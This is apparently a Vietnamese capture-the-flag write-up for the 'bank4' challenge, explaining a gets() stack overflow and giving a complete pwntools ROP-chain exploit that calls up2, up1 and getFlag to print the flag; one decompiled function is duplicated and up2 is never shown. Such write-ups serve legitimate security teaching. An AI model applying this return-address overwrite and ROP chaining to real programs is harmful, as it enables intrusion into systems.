# *bank 4*

## Task:
nc 61.28.237.24 30205

File: bank4

## Solution
Bài này cũng tương tư bài `bank3` khai thác trong hàm `Register` và overwrite return address

```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n");
}
```

```c
void __cdecl up1(int arg1, int arg2)
{
  if ( o2 && arg1 == 0x1337 && arg2 == 0xDEAD )
    o1 = 1;
}
```

```c
void __cdecl up1(int arg1, int arg2)
{
  if ( o2 && arg1 == 0x1337 && arg2 == 0xDEAD )
    o1 = 1;
}
```

```c
void getFlag()
{
  if ( o1 && o2 )
    system("cat flag.txt");
  else
    system("echo \"hcmasd-cft{nah_nah_nah_not_today}\"");
}
```

Trên đây là 4 hàm chính mà ta cần phân tích. Ta thấy trong hàm `getFlag` để in ra được `flag` phải pass được điều kiện `if` `o1` và `o2` bằng `1`

Như ở trên thì hàm `o1` được set bằng `1` trong hàm `up1` tương tự với `o2` trong hàm `up2`

vậy trước khi gọi hàm `getFlag` ta phải gọi hàm `up1` và `up2` để set `o1` và `o2`

tuy nhiên trong mỗi hàm `up` thì đều có kiểm tra điều kiện `if` với tham số truyền hàm. Ta để ý thì hàm `up1` sẽ kiểm tra điều kiện trong đó có `o2` phải bằng `1` cho nên ta sẽ gọi hàm `up2` xong rồi mới đến `up1`

Vì đây là file thực thi `32bit` cho nên đối tham số sẽ được truyền vào hàm thông qua stack

## Exploit
code python:

```python
from pwn import *

binary = context.binary = ELF('./bank4')
rop = ROP(binary)

pop_ebp_ret = rop.find_gadget(['pop ebp', 'ret'])[0]

p = process('./bank4')
#p = remote('61.28.237.24', '30205')

payload = b'A' * (0x4c + 4) # khoảng cách giữa biến name và return address
payload += p32(binary.sym.up2) # địa chỉ ham up2
payload += p32(pop_ebp_ret) # địa chỉ khối lệnh (pop ebp ; ret) -> này sẽ là return address sau khi gọi xong hàm up2
payload += p32(pop_ebp_ret) # địa chỉ khối lệnh (pop ebp ; ret) -> tham số đầu tiên của hàm up2
payload += p32(pop_ebp_ret)  # địa chỉ khối lệnh (pop ebp ; ret) -> tham số thứ 2 của hàm up2
payload += p32(0x12345678)  # -> tham số thứ 3 của hàm up2
payload += p32(binary.sym.up1) # -> địa chỉ của hàm up1
payload += p32(binary.sym.getFlag) # -> địa chỉ của hàm getFlag
payload += p32(0x1337) # -> tham số thứ nhất của hàm getFlag
payload += p32(0xDEAD) # -> tham số thứ hai của hàm getFlag



f = open('solve.txt', 'wb')

f.write(payload)

p.sendline(payload)

p.interactive()


```

bài này ta sử dụng hàm `rop` của pwn tool để lấy giá trị địa chỉ tại những instruction

đầu tiên ta tìm địa chỉ của khối lệnh `pop ebp; ret` 

Lí do ta không truyền hàm hai tham số đầu tiên của hàm `up2` là hai số mà là địa chỉ của khối lệnh `pop_ebp_ret`
bởi vì sau khi thực hiện xong hàm `up2` thì chương trình sẽ lần lượt gọi tiếp những địa chỉ tiếp theo trên stack

Ta gọi lần lượt sẽ là gọi pop_ebp_ret khi khối lệnh này thực hiện sẽ pop khỏi stack 1 giá trị chinh là tham số đầu tiên của hàm `up2`

Tiếp theo đó chương trình trả về và sẽ gọi `pop_ebp_ret` chính là tham số thứ 2 của hàm `up2` vì tham số thứ nhất đã được `pop` ra khỏi stack. Hàm này sẽ pop tham số thứ 3 của hàm `up2` 0x12345678 ra khỏi stack

sau đó gọi hàm `up1` và làm tương tự ...

# Chạy Script
vì server đã đóng nên mình tiến hành khai thác local với file flag.txt HCMUSCTF{bank4}




